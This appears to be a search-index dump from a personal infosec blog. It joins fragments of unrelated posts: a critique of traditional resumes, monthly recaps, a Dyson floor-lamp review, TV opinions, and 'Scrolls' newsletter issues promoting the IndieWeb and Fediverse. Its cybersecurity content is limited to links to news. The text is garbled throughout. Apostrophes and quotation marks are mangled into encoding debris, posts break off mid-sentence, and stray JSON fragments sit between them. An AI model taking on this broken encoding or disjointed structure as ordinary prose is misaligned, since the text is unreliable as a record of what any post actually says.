only to limit otherwise equally/more-talented younger professionals. Speaking of ‚Äútotal years experience‚Äù, what about having to include jobs you held 7+ or even 10+ years ago? This is often expected / required on traditional resumes but does little to help bolster the way you market yourself. Companies should care about what relevant skills you have, not what you were up to that long ago. This serves only as a way for companies to potentially profile or judge you based on what you did in the past. For example, let‚Äôs say you served on a help desk 10 years ago, maybe a company will think negatively of that experience. Why share your entry-level experience when they are looking for what you have done at a more senior level? Project/job held duration. This is one of my least favorite things that is expected on traditional resumes. The point here I guess is that companies want to know if you‚Äôre some sort of serial job hopper. But there are LOTS of reasons to leave a job, many of which do not or should not reflect poorly on a prospective candidate. But, despite this, I think most prospective hiring panels see short stints on a resume and think the worst, even in areas (DC metro anyone?) where short-term consulting gigs are not only common, but potentially the norm! Instead of having to conform to this exact resume format, why not market yourself how YOU want to market yourself? Traditional resume formats are designed to put you at a disadvantage, revealing everything about yourself while the company has to reveal nothing about itself. Does the company you‚Äôre applying for have to reveal everyone it has fired and why? Does it have to reveal past or future lay-off plans? Though some companies are more transparent than others, all of them - and I mean 100% of them reveal less about themselves to a prospective employee as you must divulge to them. A background check is a good example of this, when‚Äôs the last time you ran a background check on a company? We, as a society of professionals need to change our mindset on resumes, and begin to collectively accept non-standard resume formats.

I do have a substantial piece on Threat Modeling in the works so stay tuned! Shellsharks Community Once again, I recently served as a SANS virtual TA (vTA) for SEC503. This was, and has remained, my favorite SANS course - I learn a lot each time I take this training. Being able to help out other students along the way definitely helps reinforce the concepts as well!The Shellsharks Podcast For now, I plan on doing the show monthly (given the wild assortment of other responsibilities and projects I have underway right now). I‚Äôll also add that taking the time to consistently find guests for the podcast is not something I had properly allocated time and mental cycles for. What I‚Äôm Learning One of my areas of professional growth lately has been in the realm of manual code review. I‚Äôve been using this resource as a means to help propel that learning. My experience prior to now has really been more in manually reviewing SAST results, which is certainly different than pure manual review. GadgetsDefinitely a good month for gadget-ing‚Ä¶ I recently picked up a pair of Hue Play Light Bars to add some additional lighting behind my upper monitor. Getting these at the proper angle to cast the light on the wall proved too annoying however so they have been mounted somewhat parallel to the wall instead. Though I might not get the best wall coverage this way, I really just need them to brighten up the space at night and in other dim lighting conditions (early morning and late afternoon). In addition to the Play Bars, I also picked up the very unique Dyson Lightcycle Morph Floor Light in the Black/Brass finish. I‚Äôve written a small review of the product as I have quite a few thoughts on it. TL;DR is I really like the lamp. When I ordered the Lightcycle Morph, I also ordered the previous-gen Lightcycle, the Task Light. In my quest to brighten up my workspace I wanted to try a few things and I always thought the original Lightcycle looked really cool. I was hesitant in getting a desk lamp since though I have quite a large desk (it is actually a dining room table), I want as little objects on top of it as possible in order to reduce overall clutter. With that said, I thought the Task Light would look cool enough such that I wouldn‚Äôt care. Fast forwarding a bit, I took delivery of the light and after setting it up on my desk I decided that I was going to return it. Let me explain why. First, it did inevitably take up more space on the desk than I was comfortable with. Second, It interfered (being on the left side of my desk) with my podcasting mic‚Äôs boom arm. Third, I really didn‚Äôt like the way it looked as much as I thought I would, especially when compared with the Morph light, which I really like. As I have explained in my mini-review, the Morph has a lot of utility that the Task Light simply doesn‚Äôt have. I‚Äôm even considering getting the desktop version of the Morph to try out! More to come on that if it every comes back in stock =(. Apple announced their entirely new series of M1-laden MacBook Pro‚Äôs. I‚Äôm not currently in the market for a new laptop but I‚Äôm keeping my eye on what‚Äôs happening with Apple Silicon. Seeing the overall performance and efficiency improvements in computers using these chips it‚Äôs plain to see that this is the future of Apple (and computing in general!). As much as I wanted to invest in an Intel-based Mac Pro, I‚Äôm thinking more and more that a desktop-class, M1-based Mac may be what is really in store for me in the future. I picked up the new Apple Watch Series 7. Coming from a Series 4, I really haven‚Äôt noticed that much practical difference. Sure, the screen is technically bigger but the main watch face I use doesn‚Äôt take full advantage of this increase in size. There are a few new sensors onboard but I really won‚Äôt use them with any meaningful frequency. It being a new device, the battery should be pretty fresh but honestly my Series 4 battery was still very good. The real improvement for me has to be the overall snappiness of the interface. This allows me to navigate around, fire off Shortcuts and generally use the watch with greater ease. For those who have a Series 4 through Series 6, I‚Äôd recommend on holding off on this upgrade unless theres a particular feature that has been introduced in the last couple years that is particularly compelling to you. Fitness Now that I‚Äôve picked up the new Apple Watch (Series 7), I may start doing a bit more working out. Purchase of the new watch even gives you the Fitness+ service free for 3 months. TV I‚Äôve been enjoying the second season of The Morning Show. It‚Äôs not blowing my mind or anything but it‚Äôs not the genre of show that really could anyways. Dune however‚Ä¶ was REALLY good! I really want to watch the original movie and can‚Äôt wait for whatever sequels are being cooked up. What We Do In The Shadows is hilarious. Only a few episodes in so far‚Ä¶ Gaming Haven‚Äôt been doing any gaming - thinking of getting an Xbox Series X to play Halo Infinite (and eventually Diablo 4). Investing TSLA to the moon!

Dyson Lightcycle Morph Floor Light Review: I recently took delivery of and set up the Dyson Lightcycle Morph Floor Light in the Black/Brass finish. This light had been on my radar for a while now as I thought it was a really unique and cool looking gadget. Of course at 849. 99, the price was certainly a bit steep for what, at the end of the day, is just a lamp. Below I cover the good and the bad of this lamp from my perspective‚Ä¶ The Good: The physical setup of the light is dead simple. You need only get it out of the box, attach the pole to the base and then plug it in! Connecting the light to the app is a little more involved (it requires Bluetooth), but still relatively easy. I really love the design of the lamp. The light can get really bright, up to 850 lumens and can range from a very energizing, cool light (6500K) to a really relaxing warm light (2700K). The lamp is very adjustable (hence the name: ‚ÄúMorph‚Äù) as you can angle it in any direction from straight up/down to a full 360 rotation. Couple this with the lighting modes described above and you can see this light is immensely versatile. I can illuminate the surface of my desk if I am reading, shine it directly at an adjacent wall to generally brighten up my space, dim the lights to provide a more relaxed mood, etc‚Ä¶ The scenes that can be set are pretty endless! A really cool feature of the light is you can rotate the light such that it points directly down into the stem of the lamp. Here the light will illuminate the perforated stem and create a very cool ambient light mode where you just have a glowing pillar. Very cool for chilling out! The Dyson Link app offers a sync mode where the lamp will adjust it‚Äôs warmth and intensity based on the ambient light in the room and the time of day. This allows the light to adjust automatically based on the current settings of the room. Modern HomeKit lights have a very similar feature (Adaptive Lighting) so in this way they can all stay relatively in sync! Since this lamp is a floor lamp rather than a desk lamp, it keeps my desk from accumulating additional clutter. I like having a clean desk where possible so this is great! Returning a Dyson product is a very simple process. The team responsible for returns are very prompt, provide free returns and will notify you of the status all along the way. (I ordered a Task Light and did not end up keeping it. ) The Bad: The price. ~$850 for a lamp is rough. Buggy connection over Bluetooth. When attempting to interact with the light using the mobile app, I often have to force-quit the app and restart it for the Bluetooth connection to work such that I can control the light remotely. Also, since the connection is over Bluetooth, I am unable to control the light when out of Bluetooth range. No HomeKit integration. The rest of the lighting in my desk setup is controllable over HomeKit. This isn‚Äôt a huge deal but it does add an extra step when trying to get my lighting scene set at any given time. There are some touch controls on the lamp arm. These are a little difficult to control as the arm itself is very sensitive and will rotate with very little force applied. This means you need to hold the arm in place while you adjust the settings, otherwise the arm will rotate. The metal portion of the lamp arm closest to the light bulb will actually get pretty hot, so if you attempt to hold the lamp arm in place you run the risk of potential light burns (or at least experience some discomfort). The touch-based controls nearest the light (on the black plastic portion of the arm) are very sensitive, so if you accidentally brush these, you may change the setting on the light. This makes adjusting the light settings a very delicate operation as there is only a small part of the lamp arm that you can touch without accidentally changing something or (very slightly) burning yourself. The lamp sports a movement sensor, the purpose of which is to turn on when movement is detected and turn off after a certain period of time when movement is not detected. In theory this is a cool feature but in reality, when sitting at your desk for long periods of time, the light will turn off even though you are still sitting there. This feature is easily disabled. When I first set the lamp up, I believed there was an issue with the device so I initiated a call to Dyson‚Äôs customer support. Their (presumably Tier 1) customer support associate was truly dreadful to speak to. They were overly invasive in the information they needed from me in order to help troubleshoot my issue, they were not knowledgeable at all about the product in question, and they took forever to respond. Further, I opened the support session directly via the app which is incredibly fragile in actually keeping the session alive. If you navigate away from the page or close the app, the session is ended and you lose all your progress (you‚Äôre lucky if you actually make any progress with that support team though). Ultimately, the good outweighed the bad for me and I intend on keeping the light!

I finished Moon Knight and even though overall I really enjoyed it, I thought the finale ended the show in a very abrupt way.

My anger, my ego, my unwillingness to yield, my eagerness to fight, they‚Äôve set me on a path from which there is no escape. I yearned to be a savior against injustice without contemplating the cost, and by the time I looked down, there was no longer any ground beneath my feet. What is‚Ä¶ what is my sacrifice?

Site News Thanks to Medium‚Äôs incessant paywall, and modals about their paywall, I made the decision to remove Medium-based blogs from my Infosec Blogs list altogether. Honestly, I had wanted to do this for some time because I felt the overwhelming majority of the Medium sites I had added were low-quality or soon-abandoned. This took the overall blog count from 4163 to 3253. Though around that same time I went through all my Mastodon follows and added all of their personal blogs. Security Community Catalin Cimpanu, proprietor of the Risky Business newsletter and RiskyBiz podcast posted a link to my Designer Vulnerabilities list on Mastodon.

It‚Äôs hard to make anything with Jedis and light sabers bad, and I‚Äôm not saying that Acolyte is bad, but after 5 episodes I just find the plot lacks complexity, most of the characters seem sort of lifeless and the dialog is particularly, ‚Äúmeh‚Äù.

Namely, work, family and my current house-hunting quest (while also trying to maintain some sorta fitness regimen). In months past, I would stretch myself thin, or forgo sleeping (among other tricks) in favor of ‚Äúdoing it all‚Äù and I certainly have the capacity to do this in stretches, but it‚Äôs not maintainable long-term. Eventually, something suffers and ultimately, it can‚Äôt be any of the formerly mentioned things. They should always, and are always, priority number 1. The result?

Acolyte ended much the way it began - kinda meh. There were a few bright spots throughout the show (the fight scenes), but ultimately the dialog and the plot had it somewhere between ‚Äúcringe‚Äù and head-scratchy for most of the show. House of the Dragon has one more episode left in this season and it‚Äôs shaping up to be pretty crazy! It‚Äôs hard to compare two seasons of this show to the entirety of its legendary predecessor, Game of Thrones, but for me, I think it has been as good. Having more dragons definitely helps here üòÑ. I expect some serious stuff to go down in the finale, but with the show renewed for a third season, there will be plenty of unresolved story lines. My guess(es)? At least one of the newly minted (low-born) dragon-riders won‚Äôt make it. (Probably the blacksmith guy) A bigger character (and their dragon) may not make it. Maybe Daemon + Caraxes?

Ok, so you‚Äôre interested now, but how can you actually get started? I‚Äôve long maintained a list of IndieWeb site hosting providers you could peruse, and I encourage you do so. But if it looks like too many options, you could do a lot worse then to check out omg. lol. This is an amazing place to get started not only with a site of your own, but also with many other IndieWeb-esque services (e. g. Fediverse handle, custom Email, etc‚Ä¶) Looking for one last kick to convince you to get a website of your own? Maybe Dan can convince ya‚Ä¶ Alright cool, stop reading this now, go get yourself a custom domain name and a web hosting provider and meet me back here. ‚Ä¶ ‚Ä¶ You‚Äôre back! Nice. You got yourself a site, or at least you have some of the building blocks for one. Now what? Let‚Äôs get into some of the more mechanical bits, i. e. hosting and building your site. If you‚Äôre still stuck on hosting, but interested in a little DIY, check out 32x33 Institute‚Äôs series on hosting your own stuff. Next, you‚Äôll probably want to learn a bit of HTML. If you‚Äôre at this point and start thinking ‚Äúthis just seems way too over my head, I‚Äôm not a web developer or anything sheesh!‚Äù, go check out this guide on how to build a website.

Or maybe you already have a site, but yuck, it‚Äôs on Wordpress, here‚Äôs where you can go next. Finally, Stefan Bohacek also has a pretty great resource pack for getting into the IndieWeb. OK. Your site is up. But‚Ä¶ it‚Äôs looking a little empty. Or plain. Or boring. Let‚Äôs spruce it up! Typically, when I‚Äôm looking for inspiration for what to do with my site, or what to write about, I look at others right in the IndieWeb community. So here, let me showcase some cool stuff I‚Äôve encountered, which may give you some ideas for what to do with your own site! How about building a page for you to archive, or showcase your microblog/social media content? Check out this example from Mkultra. Monster. Blogrolls are a great way to share your favorite sites from around the web. They are in their own right a federated social network. Reilly Spitzfaden just shared their blogroll! Spencer Harston has a /books page, which is nothing more than a place for him to share the books he‚Äôs reading or has read. Neat! Don‚Äôt just stand up a website, share what you stand for. Tracy Durnell has done this with their Guiding principles for my website post. Wanna share a buncha stuff all at once? A ‚Äúmonthly recap‚Äù-style series is one way to go. Flamed Fury and The Shrediverse each have great examples of this. Once you‚Äôre ready to take a break from building, why not do some (IndieWeb) surfin‚Äô? Three outstanding IndieWeb/Social Web-related aggregation/search clients I‚Äôd recommend you check out include Reeder, Tapestry &amp; Surf. For discovery, I gotta turn you to my own list of IndieWeb search engines. Though two I‚Äôve seen pop up in my feeds recently include Blog of the . Day &amp; blogroll. club, both awesome! If all of that wasn‚Äôt enough for ya, check out some other cool stuff I‚Äôve come across this past week! Good Internet Magazine (announcement from alexandra) Dead Web Club Plaintext WorldLooking for your next writing challenge? Try the ‚ÄúBlog Questions Challenge‚Äù and answer these 8 questions‚Ä¶ Why did you start blogging in the first place? What platform are you using to manage your blog and why did you choose it? Have you blogged on other platforms before? How do you write your posts? For example, in a local editing tool, or in a panel/dashboard that‚Äôs part of your blog? When do you feel most inspired to write? Do you publish immediately after writing, or do you let it simmer a bit as a draft? What‚Äôs your favourite post on your blog? Any future plans for your blog? Maybe a redesign, a move to another platform, or adding a new feature? FediverseWhat‚Äôs goin‚Äô on in the Fediverse? So much. The Fedi Wiki has announced the launch of The Fedi Forum, a place for people to ask questions about Fedi software (among other things). Fediverse Discovery Providers is a project that recently launched which looks to improve decentralized search and discovery across the network. This is sorely needed as it is one of the bigger pain points of using the Fediverse. Fireside Fedi is a new show with interviews of the folks who build on the Fediverse. If you‚Äôre using Lemmy (and you should), check out phtn. app, a cool front-end app for browsing the Threadiverse! The Fediverse may be small compared to its ‚Äúcompetitors‚Äù, but it‚Äôs anything but stagnant. To succeed, does the Fediverse ultimately need to grow? @rolle doesn‚Äôt seem to think so - and I agree! Here‚Äôs how I put it‚Ä¶ The Fediverse doesn‚Äôt need everyone - everyone needs the Fediverse. So if you aren‚Äôt already here. What‚Äôs stoppin‚Äô ya? For many it seems, choosing an instance is one of the biggest hangups. Here‚Äôs a resource that can maybe help you choose the right instance. Or perhaps you‚Äôre on Bluesky and are happy there. Ok, that‚Äôs fair. But can you run a Bluesky instance on a router? On a car? On a phone? Can you have a handle on a . ARPA domain? What about a car? On the Fediverse, you can. from @celesteh@lgbt. ioBluesky users: For a mere $30 million USD, we can distribute Bluesky to one other nodeFedi users: I put an instance on my car!üòÜ Here‚Äôs some other neat stuff I‚Äôve discovered this past week‚Ä¶ Curated list of server apps with support for AP A guide to implement ActivityPub in a static site Migrate your Mastodon posts/content to a GoToSocial instance with masto gear solidThe Fediverse is important, and it‚Äôs not going anywhere. It may never be the biggest, but it doesn‚Äôt need to be. If you care about creating lasting social spaces, reading and sharing news and information without censorship or algorithmic tampering, you need to create a presence here.

I‚Äôve decided to plan the regular issuance of this publication for Fridays instead of Sundays. It‚Äôs easier for me to get it out the door with this schedule. This means your getting this issue 2 days sooner than ya thought and only ~3 days after I put out the last one. Lucky you! Now on to it‚Ä¶ IndieWebI have a site, you‚Äôre on it! Sometimes I look at it, and I don‚Äôt like what I see, or I see other sites and wish mine looked a bit more like those. Ultimately though, I find peace, because in the IndieWeb world, it‚Äôs good to be unique, just be yourself. That said, it‚Äôs great to learn, fun to build, and perfectly acceptable to be inspired by what you see elsewhere on the web. If you‚Äôre just getting started, you may be interested in joining an IndieWeb community, a website club or even starting your own ‚Äúblog club‚Äù, because y‚Äôknow, making a website can be hard, and there are a few things you might not want to do on your site-building journey. But don‚Äôt stress, you learn by doing and there‚Äôs soooo many fun things to do. You could build a link blog, or build a photoroll, or build (and then later destroy) a Likes feed. If nothing else, you could just blog for the hell of it, it doesn‚Äôt need to be great, just let the catharsis flow. But if you gotta have something, why not try this weekly blogging challenge. (That‚Äôs what I did) Music Questions Challenge: What are five of your favorite albums? What are five of your favorite songs? Favorite Instrument(s)? What song or album are you current listening to? Do you listen to the radio? If so, how often? How often do you listen to music? How often do you discover music? And how do you discover music? What‚Äôs a song or album that you enjoy that you wish had more recognition? What‚Äôs your favourite song of all time? Has your taste in music evolved over the years? Since I‚Äôve already mentioned inspiration, let‚Äôs talk about discovery a bit. Yes, search engines are worse than they‚Äôve ever been, and the actually-traveled web seems more centralized than ever, but we know the IndieWeb exists. It‚Äôs just a matter of finding these digital gardens, and once you do, saving and subscribing when you find something you like. Tapestry is the newest addition to the rich and growing collection of feed aggregation apps that we have available to us. It might not be for you, but you should check it out and see! As for finding stuff, try out Minifeed. net, BUKMARK. CLUB, smallweb. cc or Blue Pages for roaming the Indie and Old-webz. Some of my favorite things I‚Äôve stumbled across this week include Combatting doomscroll (from L. Rhodes) &amp; Tracy Durnell‚Äôs Mind Garden, check‚Äôm out! FediverseNope, it‚Äôs not just you. The Fediverse is very active right now, and there‚Äôs a lot of enthusiasm and energy across the network, being poured into all manner of projects. Frequency (currently in beta) is a Fediverse-compatible, photo-forward app which emphasizes privacy and non-algorithmic control. There‚Äôs even a Fediverse server built using NNTP of all things! Castopod is looking to show out with some tips for monetizing using their platform - OK, get it! But the big story this week is probably Reddit‚Äôs continued enshitti-slide (sub banning), resulting in a surge of interest for Threadiverse platforms, sought after for their well‚Ä¶ this exact kinda nonsense resiliency. So, might I recommend infosec. pub for my tech/infosec folks? Oh and Reddit isn‚Äôt the only centralized platform people are avoiding (*cough* Discord *cough*), NodeBB has federated and is making a statement as well. But it‚Äôs not just new apps and platform stuff, there‚Äôs a lot of connective tissue and Fedi-supporting services that are being developed as well, each enhancing and pushing the Fediverse forward. Improvements across verification, moderation &amp; reach all saw movement this week. One such organization, that is trying to push things forward, is Spritely, who‚Äôs mission is literally to ‚Äúadvance networked user freedom‚Äù, and they‚Äôre looking for your support! News aside, are you looking to improve your Fediverse-roving experience? In a non-algorithmic world, we‚Äôre responsible for self-curating our feeds, so start with following some more folks! Are you technically on Mastodon, but really haven‚Äôt quite figured it out yet? How about reading THE COUNTERFORCE GUIDE TO MASTODON AND THE FEDIVERSE (FOR PUNKS!). The recently minted Fedi Forum also seems like a great way to help, and be helped, and is unsurprisingly Fedi-native! Do you live in or near Austin, Texas? Love the Fediverse? Well Flipboard is hosting the ‚ÄúFediverse House‚Äù to talk about and showcase the social web in all its awesomeness. Not a boring day in the decentralized web is there? CybersecurityAlright cyber-frienz, here‚Äôs some stuff for you too. @kpwn announced some updates to CVE Crowd, a crowd-sourced vulnerability intelligence platform watchTowr Labs dropped an absolutely bonkers, and wildly detailed, supply chain security writeup PortSwigger publishes their annual top 10 web hacking techniques Google thinks they‚Äôve almost completely eliminated exploitable web vulnerabilities (lol) Ah, CVSS is the latest topic of discussion.

Maybe that research can help someone not end up on this list Looking for more juicy intel and security shtuff?

" }, { "id": 399, "url": "https://shellsharks.com/scrolls/scroll/2025-02-14", "title": "Scroll tres", "body": "2025/02/14 - Welcome to volume three of Scrolls, a weekly newsletter for sharing cool stuff from the IndieWeb, Fediverse &amp; Cybersecurity realms. First, a quick aside to talk about RSS (That‚Äôs right! RSS is not dead yet). I refer to this publication as a ‚Äúnewsletter‚Äù (among other things), which I think for many, evokes the idea of email. But as you have likely discovered by now, this newsletter is not emailed to you. Rather, if you want to subscribe, you must do so with good ol‚Äô fashioned RSS. To that end, I recommend getting (if you don‚Äôt have one already) an RSS client - for your phone, for your desktop, laptop, all the things. If you‚Äôre looking for more info, I‚Äôve written an RSS how-to of sorts that you can read. Once you‚Äôve got one, just drop this url https://shellsharks. com/feeds/scroll-feed. xml into it and you should be good-and-subscribed! RSS is a great tool for curating your internet experience. Now on to it! IndieWebSpeaking of your experience on the Internet, I‚Äôve got good news and bad news about the web. First, the bad news - a lot of the web sucks. So what‚Äôs the good news? Well the good news is that there is a burgeoning movement to rewild the Internet, to make it more humane, and let it flourish once more. More on this shortly, but first‚Ä¶ What makes the bad web, ‚Äúbad‚Äù? I mean, have you seen any of these things in your web travels? What about any of this annoying stuff? Run into any pathetic AI slop yet? Bet ya have. The enshittification pandemic of the centralized, corporate web is very real, and suffocatingly inescapable. So much so, that I‚Äôve come across quite a few posts about how individuals are yanking big tech out of their life completely (me too). Some of us have started to see - the bad web is dying, and we gotta get out. So where can you find the ‚Äúgood web‚Äù? The old web? The human web? The IndieWeb? Welp, you‚Äôve already found it. In fact, you‚Äôre reading it right now! Well, at least one small part of it. No matter what you call it, there are pockets of the Internet full of websites owned by individuals, with novel content, published and wholly owned by those individuals. These sites are unique, they are quirky, they probably have innumerable CSS and HTML markup issues (*cough* this site *cough*), they are expressions of those people, and of our collective humanity. They are where we gather, where we share things more than ~300 characters at a time, and where we can just be free to shout into the void. The ‚Äúgood web‚Äù isn‚Äôt just one place. The web is a digital archipelago. There is no singular map which can exhaustively take you to every island. Instead, explorers like you and me set sail and find these indie-islets, then curate and share them - with our social networks, our friends, on our own websites, etc‚Ä¶ It‚Äôs up to us to bookmark what we discover, and what we enjoy. Like philipp did when he found a cute li‚Äôl blog that had an ‚Äúart guestbook‚Äù. Another great way to save and share cool things you find is by publishing weekly summaries of links and other stuff. Take a look at these cool examples from Sophie, Joel and Micha≈Ç. Once we‚Äôve re-wilded the Internet, maybe then we can (as Courtney has done) touch grass once more. Until then, here‚Äôs some neat places I‚Äôve discovered in my own recent web surfin‚Äô. Check ‚Äòem out!‚Ä¶ Bobby Hiltz Juha-Matti Santala Beam me out!FediverseThe Fediverse, ‚Äòtis a silly place‚Ä¶ For example, I‚Äôve come to understand that this is the average Misskey experience üòÜ On to a more serious topic‚Ä¶ In the last section, we talked about enshittification, and how it has led to a growing IndieWeb movement. Well chances are, if you‚Äôre on the Fediverse, or considering moving here, it‚Äôs probably also because of that same wave of enshittification . People are leaving the entrenched social silos, and seeking out less-enshittified pastures. This hasn‚Äôt gone without notice by the larger, more-established social networks either. Meta‚Äôs Threads has sorta federated, and now Tumblr is set to join the Fediverse as well. While the incumbent web seeks to catch up, the alternative social networks, the ‚ÄúSocial Web‚Äù, pushes on. For example, Mastodon and Mbin both announced big updates in the past week alone. To reclaim the Internet, and help the continued development of these platforms, your support is needed. Consider, if you can, helping IFTAS, an independent Federated Trust &amp; Safety organization that provides nonprofit support for volunteer social web content moderators, community managers, administrators and more. There are other ways to support the Fediverse too! Just being an active participant in the various communities is a good start. Consider joining a group via FediGroups. social, contributing to the WeDistribute forum, or attending the upcoming FediForum Unconference! To close out this section, I wanted to spotlight a few Fedi projects &amp; tools worth checking out! Fedica: A multi-platform social media management tool Radicle: Open source, peer-to-peer code collaboration stack built on Git All the projects that Hong Minhee is responsible for, i. e.

" }, { "id": 400, "url": "https://shellsharks.com/scrolls/scroll/2025-02-21", "title": "Scroll quattuor", "body": "2025/02/21 - Welcome to volume four of Scrolls, a newsletter for sharing cool stuff from the IndieWeb, Fediverse &amp; Cybersecurity realms. Featured topics for this week include how, and more importantly, why to start a personal website, as well as how to join and help grow the Fediverse. Enjoy! Note: An important note about the nature of a weekly newsletter - expect topics to be revisited. I don‚Äôt mean the exact same verbiage or external sources, but there will be high-level topics and themes that are continuously explored throughout the running of this publication (e. g. ‚Äúfun things to add to your indie website‚Äù or ‚Äúhow to navigate the Fediverse‚Äù, etc‚Ä¶) It really just depends on what I discover across my various web and Fediverse feeds from that week! IndieWebThe IndieWeb is not only awesome, it‚Äôs also important. For us as individuals sure, but also for the web, and for us collectively as a civilization. 1 So whether you‚Äôve just started to shop* for your first home on the Internet, coming back to blogging from a long time away, or keeping the fire that is your site ablaze, know that it matters. 2 3 4 It should matter to you, and it will matter to others, no matter what you may think in the beginning. It‚Äôs important to own your thoughts, share what you have to say and just be yourself. 5 6 Regardless of who sees it, or whether it is ‚Äúperfectly said‚Äù. 7 8 * (Check out the Write. as ‚ÄúA Decade of Write. as Sale‚Äù if you‚Äôre site-platform shopping. Bonus: For folks on Write. as, you can now do Fediverse creator tags!) Speaking of the ‚Äúcollective‚Äù that is us as humans, and on the topic of things to say, the IndieWeb community is loaded with opportunities, and inspiration is abundant - if you know where to look! I think most of us who‚Äôve started our IndieWeb journey would like to write more, and we should (preferably not on Substack though). 9 Once we‚Äôve moved past the ‚Äúnobody cares what I have to say‚Äù phase, we usually find ourselves in the ‚ÄúI don‚Äôt have enough time‚Äù or ‚ÄúI don‚Äôt know what to say‚Äù phases. On the concept of having time to write, I have two things to offer. First, don‚Äôt sweat it. Don‚Äôt hold yourself to some cadence, just write when you have time, and when you feel like it. Second, make time. Easier said than done I know, but we all have things in our life we could cut back on, to make room for things that we‚Äôd rather do, or aspire to do. As for what to say, look towards the community! Indieweb. org hosts many events to help you meet others, find help and get the creative juices flowin‚Äô. One particularly cool event is the ‚ÄúIndieWeb Carnival‚Äù, a monthly event with a singular writing prompt/topic. Participants share their submission with the ‚Äúhost‚Äù (a volunteer position), who‚Äôs job is to simply collect all the submissions and share them in an aggregate post on their own site. Neat! The current Carnival event is all about affirmations. If that ain‚Äôt your thing, you can keep an eye out for viral blogging challenges, like this one that‚Äôs still goin‚Äô! IndieWeb-specific communities (e. g. 32-Bit Cafe), webrings (e. g. Meta Ring) and Fediverse-borne hashtags like #writerscafe &amp; #BlogQuestionsChallenge can also be great sources of writing inspiration and general community goodness. It ain‚Äôt all about writing though. Sometimes you just wanna spruce things up, make some additions or slap a new coat of paint on as it were. I‚Äôve been doin‚Äô quite a bit of this lately. In fact, just in the this last week I‚Äôve whipped up a new home page design, generated some fresh RSS feeds, and added even more Sharks! And who doesn‚Äôt want more sharks?? What‚Äôs everyone else doin‚Äô‚Ä¶ B√°lint set up a short domain for his site, Tom implemented Webmentions, and Cassidy is just doin‚Äô her thing on an awesome colorful site that I love. So take any of those things as inspiration yeah? Need some more technical help with this kinda stuff? Check out Atlas Of Types‚Äô ‚ÄúFoundries‚Äù &amp; HTML Shark (had to shout out this place of course, SHARKS~!!) Here on the IndieWeb, we may write for ourselves first, but as a community, we want to share our thoughts with others. 10 For what is shared however, others must discover. The idea of discovery is definitely going to be a constant theme here with Scrolls. So how can we find stuff? RSS! RSS! RSS! Well, to be clear, RSS isn‚Äôt exactly a net-new discovery mechanism, but it does help folks who have found your site, to keep up to date with what you post. As for finding entirely new things? feedle has a catalog of blogs (and podcasts), Julius shares a Cool Personal Homepage every week, the #MondayBlogs fedi-hashtag is used to share blogs (like Bellesmots2000 did) and publications like From The Superhighway also surface IndieWeb stuff, to name a few ways. One of my favorite types of IndieWeb-style posts is the Weekly (or whatever cadence) Summary. It‚Äôs just a nice way for anyone to share any assortment of thoughts and links to stuff they‚Äôve found. In many ways, that‚Äôs kinda what this newsletter is. Here‚Äôs some cool summary-style blogs I‚Äôve discovered recently‚Ä¶ Bookmart Beat (by Dani Sandoval) Week Notes (from And So It Goes‚Ä¶) Web Excursions (by Brett Terpstra) Weeknotes (by Michael Burkhardt) Not exactly the same, but you should also check out omg. lol‚Äôs interview seriesWeekly summaries are yet another great, super-curated way for people to discover new stuff. In that spirit, I‚Äôm-a share some stuff right here.

But we‚Äôve just gotta talk about things differently than we‚Äôve been doin‚Äô it. We can get people here - by focusing on making this place awesome, and just bein‚Äô neighborly. To this end, consider launching your own li‚Äôl social space. For your friends, family, community, or just because you can. If not for anyone else, stand up a Fediverse presence and achieve tech empowerment for yourself! Make no mistake. The Fediverse is awesome. While other networks try and figure out how to scale down, the Fediverse grows and gets even more awesome. Want to keep up with what‚Äôs goin‚Äô on Fedi-wise? Week in Fediverse, the Fediverse Report and the Fediverse Newsire (a Surf feed) are a couple of places to check out. The Mastodon Engineering account is also an obvious space to pay attention to. In fact, they recently dropped some news about bringing quote posts to Mastodon (which naturally raises a lot of questions). Not interested in news? What about just vibes. CybersecurityAh yes, Cybersecurity, easily the most neglected segment of this here newsletter. ü§£ I will find a way to weave a story with the week‚Äôs cyber-related news as I have done each week with the IndieWeb and Fediverse sections, but to use the Silo parlance - today is not that day.

But first! Why am I doing this newsletter? Why the IndieWeb, Fediverse &amp; Cybersecurity? Just why? Well, these things are awesome, that‚Äôs why! The truth is, I spend a great deal of time learning and doing a lot of stuff related to these three things. I subscribe to a lot, discover a lot, read a lot, learn a lot, build a lot. So why not synthesize some fraction of these things, compile it all, add some color, and ultimately share it with everyone else? With all of you! That‚Äôs what this is, and why I do it. (As an added bonus, it will make my job of finding something in one of these scrolls later, much easier to do. Thanks search function!) IndieWebYou should start a blog. I‚Äôve said it before, and I‚Äôll almost certainly say it again. My voice is but one in a growing chorus, all saying this same thing. Having a personal website is a big deal, and is becoming even more important each passing day. Your little site may never mean much in the grand scheme of the Internet-at-large (it doesn‚Äôt need to), but it can mean everything to you, and mean a whole heckuva-lot to the handful of folks who find you and enjoy the cozy li‚Äôl nook of the web that you‚Äôve carved out for yourself. In other words, no matter what you might think, your site matters. So go get yourself some digital land, and start building a real home on the web. Don‚Äôt just rent space from the monolithic, walled-garden platforms. One day, you can look back at your site‚Äôs humble beginnings and be proud of how far you‚Äôve come. So go, get a website, write something, build something, get wild. Speaking of building things, let me share with you some amazing things I‚Äôve discovered others in the IndieWeb community building and adding to their own websites this past week. Sage built an awesome Pok√©mon ‚Äúshrine‚Äù, which is essentially just a long list of Pok√©mon-related things that they like. The idea of a ‚Äúshrine‚Äù, or a dedicated page for a specific topic or thing that means a lot to you, is a great idea for a personal website! B√°lint made a custom 404 page, CJ updated his Now page, Marisabel shared some goals they have for their website, and David announced his blog commenting capability, Komments. cloud. If you don‚Äôt see yourself as much of a ‚Äúwriter‚Äù, consider sharing via an audioblog instead! Regardless of how or what you share, make sure to expose an RSS feed, or risk being shamed! Building, updating, tinkering and generally adding features / capabilities to a personal site is a lot of fun, and can really make a site feel like home. But to get the most out of the experience, you also need to share. Share your writing, share links to cool stuff you‚Äôve found, share anything really. Granted, it‚Äôs not always easy. Sometimes it‚Äôs hard to think of something you want to say! It‚Äôs also just difficult to maintain a regular habit of writing. But remember not to worry about ‚Äúreaders‚Äù - just write for yourself, and leverage the many sources of inspiration that are available to you. Or if you really can‚Äôt think of anything to say yourself, just boost / re-share cool stuff that others have written or shared. Andreas and Thomas did exactly this, through their Linkdump and Weeknotes summary posts (respectively). So while I‚Äôm on the subject of boosting cool things, here‚Äôs some great Indie-sites I‚Äôve discovered this past week‚Ä¶ VHS Overdrive Oh Hello Ana Nick Simson Michael Kj√∂rlingFediverseHave you made it to the Fediverse yet?
